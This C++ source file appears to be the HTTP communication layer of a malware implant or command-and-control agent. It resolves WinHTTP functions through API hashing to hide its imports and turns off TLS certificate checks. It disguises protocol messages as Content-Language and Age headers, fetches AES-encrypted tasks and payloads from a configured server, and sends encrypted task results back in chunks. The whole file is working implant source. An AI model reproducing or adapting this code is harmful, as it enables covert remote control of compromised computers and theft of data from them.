#include <AES.h>
#include <Windows.h>
#include <WinHttp.h>
#include <random>
#include <resp_builder.hpp>
#include <iostream>
#include <hashtable.h>
#include <mem_ldr.h>
#include <apidef.h>
#include <vector>
#include <cutils.h>
#include <cutils.h>
#include <config.h>
#include <module_context.h>
#define WINHTTP_IMPORT_PROLOGUE 	HMODULE winhttp = MemoryGetModuleHandle(WHASH_winhttp); \
									pfnWinHttpOpenRequest fnWinHttpOpenRequest = (pfnWinHttpOpenRequest)MemoryGetProcAddressP((PUCHAR)winhttp, HASH_WinHttpOpenRequest); \
									pfnWinHttpSetTimeouts fnWinHttpSetTimeouts = (pfnWinHttpSetTimeouts)MemoryGetProcAddressP((PUCHAR)winhttp, HASH_WinHttpSetTimeouts); \
									pfnWinHttpSendRequest fnWinHttpSendRequest = (pfnWinHttpSendRequest)MemoryGetProcAddressP((PUCHAR)winhttp, HASH_WinHttpSendRequest); \
									pfnWinHttpReceiveResponse fnWinHttpReceiveResponse = (pfnWinHttpReceiveResponse)MemoryGetProcAddressP((PUCHAR)winhttp, HASH_WinHttpReceiveResponse); \
									pfnWinHttpCloseHandle fnWinHttpCloseHandle = (pfnWinHttpCloseHandle)MemoryGetProcAddressP((PUCHAR)winhttp, HASH_WinHttpCloseHandle); \
									pfnWinHttpWriteData fnWinHttpWriteData = (pfnWinHttpWriteData)MemoryGetProcAddressP((PUCHAR)winhttp, HASH_WinHttpWriteData); \
									pfnWinHttpReadData fnWinHttpReadData = (pfnWinHttpReadData)MemoryGetProcAddressP((PUCHAR)winhttp, HASH_WinHttpReadData); \
									pfnWinHttpQueryDataAvailable fnWinHttpQueryDataAvailable = (pfnWinHttpQueryDataAvailable)MemoryGetProcAddressP((PUCHAR)winhttp, HASH_WinHttpQueryDataAvailable); \
									pfnWinHttpQueryHeaders fnWinHttpQueryHeaders = (pfnWinHttpQueryHeaders)MemoryGetProcAddressP((PUCHAR)winhttp, HASH_WinHttpQueryHeaders); \
									pfnWinHttpSetOption fnWinHttpSetOption = (pfnWinHttpSetOption)MemoryGetProcAddressP((PUCHAR)winhttp, HASH_WinHttpSetOption); \
									pfnWinHttpAddRequestHeaders fnWinHttpAddRequestHeaders = (pfnWinHttpAddRequestHeaders)MemoryGetProcAddressP((PUCHAR)winhttp, HASH_WinHttpAddRequestHeaders);
extern int g_timeout;
extern CONFIG g_conf;
std::wstring random_string(std::size_t length)
{
	const std::wstring CHARACTERS = L"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";

	std::random_device random_device;
	std::mt19937 generator(random_device());
	std::uniform_int_distribution<> distribution(0, CHARACTERS.size() - 1);

	std::wstring random_string;

	for (std::size_t i = 0; i < length; ++i)
	{
		random_string += CHARACTERS[distribution(generator)];
	}

	return random_string;
}

void _send(HINTERNET s, char* buffer, int len, std::wstring hdr) {
	WINHTTP_IMPORT_PROLOGUE
	HINTERNET hRequest = NULL;
	BOOL bResults = FALSE;
	DWORD requestFlags = 0;
	if (g_conf.http_use_ssl) requestFlags |= WINHTTP_FLAG_SECURE;

	if (s)
		hRequest = fnWinHttpOpenRequest(s, L"POST", random_string(16).c_str(),
			NULL, WINHTTP_NO_REFERER,
			WINHTTP_DEFAULT_ACCEPT_TYPES,
			requestFlags);

	if (hRequest) {
		if (g_conf.http_use_ssl) {
			DWORD dwFlags = SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
				SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
				SECURITY_FLAG_IGNORE_UNKNOWN_CA;
			bResults = fnWinHttpSetOption(
				hRequest,
				WINHTTP_OPTION_SECURITY_FLAGS,
				&dwFlags,
				sizeof(DWORD)
			);
		}

		fnWinHttpSetTimeouts(hRequest, g_timeout, g_timeout, g_timeout, g_timeout);
		bResults = fnWinHttpSendRequest(hRequest,
			hdr.c_str(), hdr.size(),
			buffer, len,
			len, 0);
	}
	if (bResults)
		bResults = fnWinHttpReceiveResponse(hRequest, 0);

	fnWinHttpCloseHandle(hRequest);
	return;
}
void _recv(HINTERNET s, char* buffer, int& len, std::wstring hdr) {
	WINHTTP_IMPORT_PROLOGUE
	HINTERNET hRequest = NULL,
		hConnect = s;
	BOOL bResults = 0;
	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	PCHAR pszOutBuffer = 0;
	DWORD requestFlags = 0;
	if (g_conf.http_use_ssl) requestFlags |= WINHTTP_FLAG_SECURE;

	if (s)
		hRequest = fnWinHttpOpenRequest(hConnect, L"GET", random_string(16).c_str(),
			NULL, WINHTTP_NO_REFERER,
			WINHTTP_DEFAULT_ACCEPT_TYPES,
			requestFlags);

	// Send a request.
	if (hRequest) {
		if (g_conf.http_use_ssl) {
			DWORD dwFlags = SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
				SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
				SECURITY_FLAG_IGNORE_UNKNOWN_CA;
			bResults = fnWinHttpSetOption(
				hRequest,
				WINHTTP_OPTION_SECURITY_FLAGS,
				&dwFlags,
				sizeof(DWORD)
			);
		}

		fnWinHttpSetTimeouts(hRequest, g_timeout, g_timeout, g_timeout, g_timeout);
		bResults = fnWinHttpSendRequest(hRequest,
			hdr.c_str(), hdr.size(),
			WINHTTP_NO_REQUEST_DATA, 0,
			0, 0);
	}

	// End the request.
	if (bResults)
		bResults = fnWinHttpReceiveResponse(hRequest, NULL);

	std::string out;
	DWORD length = sizeof(DWORD);
	DWORD content_length = 0;
	bResults = fnWinHttpQueryHeaders(hRequest,
		WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER,
		WINHTTP_HEADER_NAME_BY_INDEX,
		&content_length,
		&length,
		WINHTTP_NO_HEADER_INDEX);

	if (bResults)
	{
		pszOutBuffer = new char[content_length + 1];
		if (!fnWinHttpReadData(hRequest, (LPVOID)pszOutBuffer, content_length, &dwDownloaded)) {
			fnWinHttpCloseHandle(hRequest);
			return;
		}
		else {
			if (!buffer)
			{
				buffer = pszOutBuffer;
				len = dwDownloaded;
			}
			else
			{
				_memcpy(buffer, pszOutBuffer, dwDownloaded);
				len = dwDownloaded;
				delete[] pszOutBuffer;
			}

			fnWinHttpCloseHandle(hRequest);
			return;
		}
	}
	else
	{
		do
		{
			dwSize = 0;
			if (!fnWinHttpQueryDataAvailable(hRequest, &dwSize))
				continue;

			pszOutBuffer = new char[dwSize + 1];
			if (!pszOutBuffer)
			{
				dwSize = 0;
			}
			else
			{
				ZeroMemory(pszOutBuffer, dwSize + 1);
				if (!fnWinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
					dwSize, &dwDownloaded))
					continue;
				else
					out += pszOutBuffer;
				delete[] pszOutBuffer;
			}
		} while (dwSize > 0);
	}

	if (bResults) {
		len = out.size();
		if (!buffer)
		{
			buffer = new char[len];
		}
		_memcpy(buffer, out.data(), len);
	}

	fnWinHttpCloseHandle(hRequest);
	return;
}
void _recv(HINTERNET s, std::vector<UCHAR>& buffer, std::wstring hdr) {
	WINHTTP_IMPORT_PROLOGUE
	HINTERNET hRequest = NULL,
		hConnect = s;
	BOOL bResults = 0;
	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	PCHAR pszOutBuffer = 0;
	DWORD requestFlags = 0;
	if (g_conf.http_use_ssl) requestFlags |= WINHTTP_FLAG_SECURE;

	if (hConnect)
		hRequest = fnWinHttpOpenRequest(hConnect, L"GET", random_string(16).c_str(),
			NULL, WINHTTP_NO_REFERER,
			WINHTTP_DEFAULT_ACCEPT_TYPES,
			requestFlags);


	// Send a request.
	if (hRequest) {
		if (g_conf.http_use_ssl) {
			DWORD dwFlags = SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
				SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
				SECURITY_FLAG_IGNORE_UNKNOWN_CA;
			bResults = fnWinHttpSetOption(
				hRequest,
				WINHTTP_OPTION_SECURITY_FLAGS,
				&dwFlags,
				sizeof(DWORD)
			);
		}

		fnWinHttpSetTimeouts(hRequest, g_timeout, g_timeout, g_timeout, g_timeout);
		bResults = fnWinHttpSendRequest(hRequest,
			hdr.c_str(), hdr.size(),
			WINHTTP_NO_REQUEST_DATA, 0,
			0, 0);
	}

	// End the request.
	if (bResults)
		bResults = fnWinHttpReceiveResponse(hRequest, NULL);


	std::string out;
	DWORD length = sizeof(DWORD);
	DWORD content_length = 0;
	bResults = fnWinHttpQueryHeaders(hRequest,
		WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER,
		WINHTTP_HEADER_NAME_BY_INDEX,
		&content_length,
		&length,
		WINHTTP_NO_HEADER_INDEX);

	if (bResults)
	{
		pszOutBuffer = new char[content_length + 1];
		if (!fnWinHttpReadData(hRequest, (LPVOID)pszOutBuffer, content_length, &dwDownloaded)) {
			fnWinHttpCloseHandle(hRequest);
			return;
		}
		else {
			buffer.assign(pszOutBuffer, pszOutBuffer + dwDownloaded);
			fnWinHttpCloseHandle(hRequest);
			return;
		}
	}
	else
	{
		do
		{
			dwSize = 0;
			if (!fnWinHttpQueryDataAvailable(hRequest, &dwSize))
				continue;

			pszOutBuffer = new char[dwSize + 1];
			if (!pszOutBuffer)
			{
				dwSize = 0;
			}
			else
			{
				ZeroMemory(pszOutBuffer, dwSize + 1);
				if (!fnWinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
					dwSize, &dwDownloaded))
					continue;
				else
					out += pszOutBuffer;
				delete[] pszOutBuffer;
			}
		} while (dwSize > 0);
	}

	if (bResults) {
		buffer.assign(out.begin(), out.end());
	}

	fnWinHttpCloseHandle(hRequest);
	return;
}

void _recv_taskinfo(HINTERNET s, std::vector<UCHAR>& buffer, std::wstring hdr, DWORD *task_rid) {
	WINHTTP_IMPORT_PROLOGUE
		HINTERNET hRequest = NULL,
		hConnect = s;
	BOOL bResults = 0;
	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	PCHAR pszOutBuffer = 0;
	DWORD requestFlags = 0;
	if (g_conf.http_use_ssl) requestFlags |= WINHTTP_FLAG_SECURE;

	if (hConnect)
		hRequest = fnWinHttpOpenRequest(hConnect, L"GET", random_string(16).c_str(),
			NULL, WINHTTP_NO_REFERER,
			WINHTTP_DEFAULT_ACCEPT_TYPES,
			requestFlags);


	// Send a request.
	if (hRequest) {
		if (g_conf.http_use_ssl) {
			DWORD dwFlags = SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
				SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
				SECURITY_FLAG_IGNORE_UNKNOWN_CA;
			bResults = fnWinHttpSetOption(
				hRequest,
				WINHTTP_OPTION_SECURITY_FLAGS,
				&dwFlags,
				sizeof(DWORD)
			);
		}

		fnWinHttpSetTimeouts(hRequest, g_timeout, g_timeout, g_timeout, g_timeout);
		bResults = fnWinHttpSendRequest(hRequest,
			hdr.c_str(), hdr.size(),
			WINHTTP_NO_REQUEST_DATA, 0,
			0, 0);
	}

	// End the request.
	if (bResults)
		bResults = fnWinHttpReceiveResponse(hRequest, NULL);


	std::string out;
	DWORD length = sizeof(DWORD);
	DWORD content_length = 0;
	*task_rid = 0;

	bResults = fnWinHttpQueryHeaders(hRequest,
		WINHTTP_QUERY_AGE | WINHTTP_QUERY_FLAG_NUMBER,
		WINHTTP_HEADER_NAME_BY_INDEX,
		task_rid,
		&length,
		WINHTTP_NO_HEADER_INDEX);
	if (!*task_rid) {
		fnWinHttpCloseHandle(hRequest);
		return;
	}
	length = sizeof(DWORD);
	bResults = fnWinHttpQueryHeaders(hRequest,
		WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER,
		WINHTTP_HEADER_NAME_BY_INDEX,
		&content_length,
		&length,
		WINHTTP_NO_HEADER_INDEX);

	if (bResults)
	{
		pszOutBuffer = new char[content_length + 1];
		if (!fnWinHttpReadData(hRequest, (LPVOID)pszOutBuffer, content_length, &dwDownloaded)) {
			fnWinHttpCloseHandle(hRequest);
			return;
		}
		else {
			buffer.assign(pszOutBuffer, pszOutBuffer + dwDownloaded);
			fnWinHttpCloseHandle(hRequest);
			return;
		}
	}
	else
	{
		do
		{
			dwSize = 0;
			if (!fnWinHttpQueryDataAvailable(hRequest, &dwSize))
				continue;

			pszOutBuffer = new char[dwSize + 1];
			if (!pszOutBuffer)
			{
				dwSize = 0;
			}
			else
			{
				ZeroMemory(pszOutBuffer, dwSize + 1);
				if (!fnWinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
					dwSize, &dwDownloaded))
					continue;
				else
					out += pszOutBuffer;
				delete[] pszOutBuffer;
			}
		} while (dwSize > 0);
	}

	if (bResults) {
		buffer.assign(out.begin(), out.end());
	}

	fnWinHttpCloseHandle(hRequest);
	return;
}
void recv_encrypted(std::vector<UCHAR> key, std::vector<UCHAR> iv, HINTERNET s, char* buffer, int& len, std::wstring hdr) {
	_recv(s, buffer, len, hdr);


	AES aes(AESKeyLength::AES_256);
	std::vector<UCHAR> vec_data(buffer, buffer + len);

	auto data = aes.DecryptCBC(vec_data, key, iv);
	len = data.size();
	_memcpy(buffer, data.data(), len);

	return;
}
void send_encrypted_chunked(std::vector<UCHAR> key, std::vector<UCHAR> iv, HINTERNET s, std::vector<UCHAR> buffer, ResponseBuilder* builder, std::wstring whdr) {
	WINHTTP_IMPORT_PROLOGUE
	builder->add_long(buffer.size());
	builder->padding(16);
	auto first_chunk = builder->build();
	int total_size = 0;
	int chunkSize = 1024;
	char chunkSizeString[128];

	DWORD requestFlags = 0;
	if (g_conf.http_use_ssl) requestFlags |= WINHTTP_FLAG_SECURE;
	char a[256];
	auto request = fnWinHttpOpenRequest(s, L"POST", random_string(16).c_str(),
		NULL, WINHTTP_NO_REFERER,
		WINHTTP_DEFAULT_ACCEPT_TYPES,
		requestFlags);

	if (g_conf.http_use_ssl) {
		DWORD dwFlags = SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
			SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
			SECURITY_FLAG_IGNORE_UNKNOWN_CA;
		fnWinHttpSetOption(
			request,
			WINHTTP_OPTION_SECURITY_FLAGS,
			&dwFlags,
			sizeof(DWORD)
		);
	}

	AES aes(AESKeyLength::AES_256);
	whdr += L"Transfer-Encoding: chunked\r\n";
	BOOL r = fnWinHttpAddRequestHeaders(request, whdr.c_str(), -1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_COALESCE_WITH_SEMICOLON);
	//sprintf(a, "%d %x", r, GetLastError());
	//MessageBoxA(0, a, 0, 0);
	r = fnWinHttpSendRequest(request,
		WINHTTP_NO_ADDITIONAL_HEADERS,
		0, WINHTTP_NO_REQUEST_DATA, 0,
		WINHTTP_IGNORE_REQUEST_TOTAL_LENGTH, 0);

	//sprintf(a, "%d %x %ws", r, GetLastError(), whdr.c_str());
	//MessageBoxA(0, a, 0, 0);
	DWORD m_totalBytesWritten = 0;
	sprintf(chunkSizeString, "%d\r\n", first_chunk.size());
	fnWinHttpWriteData(request, chunkSizeString, strlen(chunkSizeString), (LPDWORD)&m_totalBytesWritten);
	//sprintf(a, "%d %x", m_totalBytesWritten, GetLastError());
//	MessageBoxA(0, a, 0, 0);
	fnWinHttpWriteData(request, aes.EncryptCBC(first_chunk, key, iv).data(), first_chunk.size(), (LPDWORD)&m_totalBytesWritten);
	//sprintf(a, "%d %x", m_totalBytesWritten, GetLastError());
//	MessageBoxA(0, a, 0, 0);
	auto vec_data = buffer;
	while (vec_data.size() % 16 != 0 || vec_data.size() == 0) {
		vec_data.resize(vec_data.size() + 1);
	}

	auto data2 = aes.EncryptCBC(vec_data, key, iv);
	vec_data.~vector();
	for (int i = 0; i < ((data2.size() / chunkSize) + ((data2.size() % chunkSize) != 0)); i++)
	{
		if (total_size + chunkSize < data2.size())
		{
			sprintf(chunkSizeString, "%d\r\n", chunkSize);
			fnWinHttpWriteData(request, chunkSizeString, strlen(chunkSizeString), (LPDWORD)&m_totalBytesWritten);
//			sprintf(a, "%d %x", m_totalBytesWritten, GetLastError());
//			MessageBoxA(0, a, 0, 0);
			fnWinHttpWriteData(request, data2.data() + total_size, chunkSize, (LPDWORD)&m_totalBytesWritten);
//			sprintf(a, "%d %x", m_totalBytesWritten, GetLastError());
//			MessageBoxA(0, a, 0, 0);
			total_size += chunkSize;
		}
		else
		{
			sprintf(chunkSizeString, "%d\r\n", data2.size() - total_size);
			fnWinHttpWriteData(request, chunkSizeString, strlen(chunkSizeString), (LPDWORD)&m_totalBytesWritten);
//			sprintf(a, "%d %x", m_totalBytesWritten, GetLastError());
//			MessageBoxA(0, a, 0, 0);
			fnWinHttpWriteData(request, data2.data() + total_size, data2.size() - total_size, (LPDWORD)&m_totalBytesWritten);
//			sprintf(a, "%d %x", m_totalBytesWritten, GetLastError());
//			MessageBoxA(0, a, 0, 0);
			fnWinHttpWriteData(request, "0\r\n", strlen("0\r\n"), (LPDWORD)&m_totalBytesWritten); // the last zero chunk, end of transmission 
//			sprintf(a, "%d %x", m_totalBytesWritten, GetLastError());
	//		MessageBoxA(0, a, 0, 0);
		}
	}
	fnWinHttpReceiveResponse(request, 0);
//	sprintf(a, "%d %x", request, GetLastError());
//	MessageBoxA(0, a, 0, 0);
	fnWinHttpCloseHandle(request);
	data2.~vector();
	buffer.~vector();
	return;
}
void recv_encrypted(std::vector<UCHAR> key, std::vector<UCHAR> iv, HINTERNET s, std::vector<UCHAR>& buffer, std::wstring hdr) {
	_recv(s, buffer, hdr);
	AES aes(AESKeyLength::AES_256);

	buffer = aes.DecryptCBC(buffer, key, iv);

	return;
}
void send_encrypted(std::vector<UCHAR> key, std::vector<UCHAR> iv, HINTERNET s, char* buffer, int len, std::wstring hdr) {
	HINTERNET hRequest = NULL;
	BOOL bResults = FALSE;

	AES aes(AESKeyLength::AES_256);
	std::vector<UCHAR> vec_data(buffer, buffer + len);
	auto data = aes.EncryptCBC(vec_data, key, iv);

	_send(s, (char*)data.data(), len, hdr);


	return;
}


void send_encrypted_taskresponse(VOID *pctx, char* buffer, int len) {
	PMODULE_CONTEXT ctx = (PMODULE_CONTEXT)pctx;
	std::wstring hdr = std::wstring(L"Content-Language: en-NZ\r\nAge: ") + std::to_wstring(ctx->random_id) + std::wstring(L"\r\n");
	send_encrypted(ctx->aes_key, ctx->iv, ctx->conn_handle, buffer, len, hdr);
}

void send_encrypted_taskresponse_big(VOID *pctx, std::vector<UCHAR> buffer, ResponseBuilder* builder) {
	PMODULE_CONTEXT ctx = (PMODULE_CONTEXT)pctx;
	std::wstring hdr = std::wstring(L"Content-Language: en-NZ\r\nAge: ") + std::to_wstring(ctx->random_id) + std::wstring(L"\r\n");
	send_encrypted_chunked(ctx->aes_key, ctx->iv, ctx->conn_handle, buffer, builder, hdr);
}

void recv_hellorequest(SOCKET s, char* buffer, int& size) {
	_recv((HINTERNET)s, buffer, size, L"Content-Language: en-US\r\n");
}
void recv_payloadinfo(SOCKET s, char* buffer, int& size) {
	_recv((HINTERNET)s, buffer, size, L"Content-Language: en-CA\r\n");
}
void recv_payload(SOCKET s, char* buffer, int size) {
	_recv((HINTERNET)s, buffer, size, L"Content-Language: en-AU\r\n");
}
void send_hellorequest(SOCKET s, char* buffer, int size) {
	_send((HINTERNET)s, buffer, size, L"Content-Language: en-US\r\n");
}

DWORD recv_encrypted_taskinfo(std::vector<UCHAR> aes_key, std::vector<UCHAR> iv, SOCKET s, std::vector<UCHAR> &data) {
	_recv( (HINTERNET)s, data, L"Content-Language: en-NZ\r\n");
	if (!is_data_null((char*)data.data(), data.size())) {
		AES aes(AESKeyLength::AES_256);
		data = aes.DecryptCBC(data, aes_key, iv);
	}
	return data.size();
}